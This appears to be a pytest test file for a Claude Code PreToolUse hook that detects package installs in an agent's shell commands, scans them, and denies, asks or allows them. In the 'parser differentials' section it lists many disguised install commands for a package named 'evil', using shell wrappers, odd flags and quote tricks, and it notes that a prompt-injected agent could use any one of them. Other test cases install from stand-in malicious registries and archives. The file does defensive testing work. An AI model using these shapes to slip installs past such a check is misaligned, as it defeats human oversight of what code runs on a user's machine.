"""The Claude Code PreToolUse hook: which shell commands install a component, and what it answers.

A plugin hook runs before every Bash call the agent makes, so the parser must find the package an
install command brings in and stay silent on everything else. Scanning is injected, so these tests
never touch the network.
"""

from __future__ import annotations

import pytest

from skilltotal.agent_hook import MAX_TARGETS, hook_response, install_targets

INSTALL_COMMANDS = [
    (
        "npx -y @modelcontextprotocol/server-filesystem /tmp",
        ["npm:@modelcontextprotocol/server-filesystem"],
    ),
    ("npx --yes mcp-remote@0.1.2 https://x.example", ["npm:mcp-remote"]),
    ("npx -p some-pkg@latest some-bin", ["npm:some-pkg"]),
    ("npm install lodash @scope/thing@2.1.0", ["npm:lodash", "npm:@scope/thing"]),
    ("npm i -D typescript", ["npm:typescript"]),
    ("pnpm add zod && yarn add left-pad", ["npm:zod", "npm:left-pad"]),
    ("bun add hono", ["npm:hono"]),
    ("bunx cowsay hi", ["npm:cowsay"]),
    ("pnpm dlx create-thing", ["npm:create-thing"]),
    (
        "pip install requests==2.32.0 'fastapi[standard]>=0.110'",
        ["pypi:requests", "pypi:fastapi"],
    ),
    ("python -m pip install --upgrade mcp", ["pypi:mcp"]),
    ("pip3 install -U httpx", ["pypi:httpx"]),
    ("uv add pydantic", ["pypi:pydantic"]),
    ("uv pip install rich", ["pypi:rich"]),
    ("uvx mcp-server-git --repository .", ["pypi:mcp-server-git"]),
    ("uvx --from mcp-server-fetch mcp-server-fetch", ["pypi:mcp-server-fetch"]),
    ("pipx install black", ["pypi:black"]),
    ("pipx run cowsay", ["pypi:cowsay"]),
    (
        "claude mcp add filesystem -s user -- npx -y @modelcontextprotocol/server-filesystem ~",
        ["npm:@modelcontextprotocol/server-filesystem"],
    ),
    ("claude mcp add git -- uvx mcp-server-git", ["pypi:mcp-server-git"]),
    ("FOO=1 sudo npm install -g pnpm", ["npm:pnpm"]),
    ("cd web; npm install express", ["npm:express"]),
    # npx fetches `tsc` from the registry when it is not installed locally (a squatted name).
    ("npx tsc --noEmit", ["npm:tsc"]),
]


@pytest.mark.parametrize(("command", "expected"), INSTALL_COMMANDS)
def test_finds_what_an_install_command_brings_in(command, expected):
    assert install_targets(command) == expected


@pytest.mark.parametrize(
    "command",
    [
        "npm test",
        "npm install",  # the lockfile, nothing new
        "npm ci",
        "npm run build",
        "pip install -r requirements.txt",
        "pip install -e .",
        "pip install ./dist/pkg-1.0-py3-none-any.whl",
        "pip --version",
        "git status",
        "echo 'npm install evil'",
        "grep -r 'pip install' docs",
        "claude mcp list",
        "ls node_modules",
        "",
    ],
)
def test_stays_silent_on_commands_that_install_nothing_new(command):
    assert install_targets(command) == []


def test_caps_the_number_of_packages_checked():
    command = "npm install " + " ".join(f"pkg{i}" for i in range(20))
    assert len(install_targets(command)) == MAX_TARGETS


def test_unparseable_quoting_is_ignored_not_raised():
    assert install_targets("npm install 'unterminated") == []


def _report(level="low", score=0, malicious=False, headline="No malicious indicators"):
    return {
        "risk_level": level,
        "risk_score": score,
        "verdict": {"has_malicious_indicators": malicious, "headline": headline},
    }


def _bash(command):
    return {"hook_event_name": "PreToolUse", "tool_name": "Bash",
            "tool_input": {"command": command}}


def test_a_non_install_command_gets_no_answer_and_no_scan():
    calls = []
    assert hook_response(_bash("npm test"), scan=lambda s, t: calls.append(s)) is None
    assert calls == []


def test_a_non_bash_tool_gets_no_answer():
    event = {"hook_event_name": "PreToolUse", "tool_name": "Write",
             "tool_input": {"file_path": "x"}}
    assert hook_response(event, scan=lambda s, t: _report()) is None


def test_a_malicious_package_is_denied_with_the_reason_for_the_agent():
    out = hook_response(
        _bash("npx -y evil-mcp"),
        scan=lambda s, t: _report("critical", 100, True, "Malicious indicators: install script"),
    )
    spec = out["hookSpecificOutput"]
    assert spec["hookEventName"] == "PreToolUse"
    assert spec["permissionDecision"] == "deny"
    assert "npm:evil-mcp" in spec["permissionDecisionReason"]
    assert "Malicious indicators" in spec["permissionDecisionReason"]


def test_a_high_risk_package_asks_the_person():
    out = hook_response(_bash("pip install risky"), scan=lambda s, t: _report("high", 60))
    spec = out["hookSpecificOutput"]
    assert spec["permissionDecision"] == "ask"
    assert "pypi:risky" in spec["permissionDecisionReason"]
    assert "60/100" in spec["permissionDecisionReason"]


def test_the_reason_reads_as_sentences_the_agent_can_act_on():
    """Seen in a real session: 'Seeded verdict Run `skilltotal scan`' and the score said twice."""
    deny = hook_response(_bash("npx bad"), scan=lambda s, t: _report("critical", 100, True, "Odd"))
    assert "Odd. Run `skilltotal scan" in deny["hookSpecificOutput"]["permissionDecisionReason"]
    ask = hook_response(_bash("pip install risky"), scan=lambda s, t: _report("high", 60))
    reason = ask["hookSpecificOutput"]["permissionDecisionReason"]
    assert reason.count("60/100") == 1
    assert ". Run `skilltotal scan" in reason
    # Nothing to scan behind a custom index, so no advice to scan it.
    custom = hook_response(_bash("pip install -i https://pypi.example.invalid/simple x"),
                           scan=lambda s, t: _report())
    assert "skilltotal scan" not in custom["hookSpecificOutput"]["permissionDecisionReason"]


def test_a_clean_package_proceeds_with_a_note_for_the_agent():
    out = hook_response(_bash("npm install lodash"), scan=lambda s, t: _report("low", 0))
    spec = out["hookSpecificOutput"]
    assert "permissionDecision" not in spec  # the normal permission flow decides
    assert "npm:lodash" in spec["additionalContext"]


def test_the_worst_package_decides_for_the_whole_command():
    reports = {"npm:fine": _report(), "npm:bad": _report("critical", 100, True, "Malicious")}
    out = hook_response(_bash("npm install fine bad"), scan=lambda s, t: reports[s])
    assert out["hookSpecificOutput"]["permissionDecision"] == "deny"
    assert "npm:bad" in out["hookSpecificOutput"]["permissionDecisionReason"]


def test_a_scan_that_fails_never_blocks_the_install():
    def boom(source, timeout):
        raise RuntimeError("registry unreachable")

    out = hook_response(_bash("npm install lodash"), scan=boom)
    spec = out["hookSpecificOutput"]
    assert "permissionDecision" not in spec
    assert "could not be checked" in spec["additionalContext"]


def test_a_scan_over_the_time_budget_lets_the_install_proceed():
    """A large package can take longer to scan than a person will wait before every install.

    Each scan gets what is left of the budget; one that runs out (the CLI kills the scan process)
    lets the install go ahead, marked as not checked in time.
    """
    given = []

    def slow(source, timeout):
        given.append(timeout)
        raise TimeoutError

    out = hook_response(_bash("npm install huge"), scan=slow, budget_s=12.0)
    assert 0 < given[0] <= 12.0
    spec = out["hookSpecificOutput"]
    assert "permissionDecision" not in spec
    assert "npm:huge" in spec["additionalContext"]
    assert "in time" in spec["additionalContext"]


def test_no_scan_starts_once_the_budget_is_spent():
    calls = []
    out = hook_response(
        _bash("npm install a b"), scan=lambda s, t: calls.append(s) or _report(), budget_s=0
    )
    assert calls == []
    assert "not checked in time" in out["hookSpecificOutput"]["additionalContext"]


def test_the_cli_scan_runs_in_a_process_it_can_kill_and_cleans_up(tmp_path, monkeypatch):
    """The real scanner behind the hook: a report on time, TimeoutError past the deadline, and no
    temp directory left behind either way (a killed scan cannot clean up after itself)."""
    import tempfile
    from pathlib import Path

    from skilltotal.cli import _hook_scan

    monkeypatch.setattr(tempfile, "tempdir", str(tmp_path))
    component = tmp_path / "component"
    component.mkdir()
    (component / "index.js").write_text("module.exports = 1;\n", encoding="utf-8")

    report = _hook_scan(str(component), timeout=120)
    assert report["risk_level"] == "low"

    with pytest.raises(TimeoutError):
        _hook_scan(str(component), timeout=0.01)
    assert not list(Path(tmp_path).glob("skilltotal_hook_*"))


def test_a_checked_package_is_not_scanned_again_for_a_day(tmp_path, monkeypatch):
    """Agents run the same `npx tsc` / `npx prettier` over and over; each must not cost a scan."""
    import skilltotal.cli as cli

    monkeypatch.setenv("SKILLTOTAL_CACHE_DIR", str(tmp_path))
    calls = []

    def fake(source, timeout):
        calls.append(source)
        return _report("low", 0)

    monkeypatch.setattr(cli, "_hook_scan", fake)
    clock = [1_000_000.0]
    monkeypatch.setattr(cli.time, "time", lambda: clock[0])

    assert cli._hook_scan_cached("npm:tsc", 20)["risk_level"] == "low"
    assert cli._hook_scan_cached("npm:tsc", 20)["risk_level"] == "low"
    assert calls == ["npm:tsc"]

    clock[0] += 25 * 3600  # a day later the package may have a new release
    cli._hook_scan_cached("npm:tsc", 20)
    assert calls == ["npm:tsc", "npm:tsc"]

    monkeypatch.setattr(cli, "__version__", "999.0.0")  # a new engine may see what the old missed
    cli._hook_scan_cached("npm:tsc", 20)
    assert len(calls) == 3


def test_a_failed_or_late_scan_is_not_cached(tmp_path, monkeypatch):
    import skilltotal.cli as cli

    monkeypatch.setenv("SKILLTOTAL_CACHE_DIR", str(tmp_path))
    calls = []

    def late(source, timeout):
        calls.append(source)
        raise TimeoutError

    monkeypatch.setattr(cli, "_hook_scan", late)
    for _ in range(2):
        with pytest.raises(TimeoutError):
            cli._hook_scan_cached("npm:zod", 20)
    assert len(calls) == 2


def test_a_corrupt_cache_file_is_ignored(tmp_path, monkeypatch):
    import skilltotal.cli as cli

    monkeypatch.setenv("SKILLTOTAL_CACHE_DIR", str(tmp_path))
    (tmp_path / "hook-cache.json").write_text("{not json", encoding="utf-8")
    monkeypatch.setattr(cli, "_hook_scan", lambda s, t: _report())
    assert cli._hook_scan_cached("npm:x", 20)["risk_level"] == "low"


# --- Parser differentials: the shell installs, the parser must not look away -------------------
# Found by a security review of the first cut: each of these installs `evil` when the shell runs
# it, and the parser returned nothing. A prompt-injected agent only has to pick one.


DIFFERENTIAL_COMMANDS = [
    "npm --silent install evil",
    "npm --prefix x install evil",
    "npm --loglevel=error i evil",
    "pip -q install evil",
    "pip --disable-pip-version-check install evil",
    "python -I -m pip install evil",
    "python3.12 -m pip install evil",
    "uv --quiet add evil",
    "/usr/bin/npm install evil",
    "npm.cmd install evil",
    r"'C:\Program Files\nodejs\npm.cmd' install evil",
    "bash -c 'npm install evil'",
    "bash -lc 'npm install evil'",
    'sh -c "pip install evil"',
    "cmd /c npm install evil",
    "powershell -Command npm install evil",
    "exec npm install evil",
    "nohup npx evil &",
    "time npm i evil",
    "command npm install evil",
    "nice -n 5 npm install evil",
    "timeout 60 npm install evil",
    "env -i PATH=/usr/bin npm install evil",
    "sudo -u root npm install evil",
    "echo $(npm install evil)",
    "echo `pip install evil`",
    "true & npm install evil",
    "npm in evil",
    "npm isnt evil",
    "npm exec evil",
    "npm x evil",
    "yarn dlx evil",
    "yarn global add evil",
    "bun x evil",
    "uv tool install evil",
    "uv tool run evil",
    "pipx inject myenv evil",
    "uvx --with evil black",
    "uv run --with evil script.py",
    # The shell is case-insensitive about the program on Windows and drops quotes and
    # backslashes before it runs anything.
    "NPM install evil",
    "PIP3 install evil",
    "n''px evil",
    'p"i"p install evil',
    r"\npm install evil",
]


@pytest.mark.parametrize("command", DIFFERENTIAL_COMMANDS)
def test_install_shapes_the_shell_accepts_are_found(command):
    assert {"npm:evil", "pypi:evil"} & set(install_targets(command))


GITHUB_COMMANDS = [
    ("npm install github:someone/tool", ["https://github.com/someone/tool"]),
    ("npm install someone/tool", ["https://github.com/someone/tool"]),
    ("npm install git+https://github.com/someone/tool.git", ["https://github.com/someone/tool"]),
    ("pip install git+https://github.com/someone/tool.git@main", ["https://github.com/someone/tool"]),
    ("npx github:someone/tool", ["https://github.com/someone/tool"]),
]


@pytest.mark.parametrize(("command", "expected"), GITHUB_COMMANDS)
def test_installs_from_github_are_scanned_from_the_repository(command, expected):
    assert install_targets(command) == expected


UNVERIFIABLE_COMMANDS = [
    "npm install --registry https://registry.evil.example pkg",
    "npm install pkg --registry=https://registry.evil.example",
    "pip install --index-url https://pypi.evil.example/simple pkg",
    "pip install -i https://pypi.evil.example/simple pkg",
    "pip install --extra-index-url https://pypi.evil.example/simple pkg",
    "uv add --index https://pypi.evil.example/simple pkg",
    "npm install https://evil.example/pkg-1.0.0.tgz",
    "pip install https://evil.example/pkg-1.0.tar.gz",
]


@pytest.mark.parametrize("command", UNVERIFIABLE_COMMANDS)
def test_installs_the_scanner_cannot_see_ask_the_person(command):
    """A custom registry or a remote archive serves something other than what the public
    registry would; scanning the public copy would vouch for code that is not being installed."""
    calls = []
    out = hook_response(_bash(command), scan=lambda s, t: calls.append(s) or _report())
    spec = out["hookSpecificOutput"]
    assert spec["permissionDecision"] == "ask"
    assert "can't check" in spec["permissionDecisionReason"]
    assert calls == []
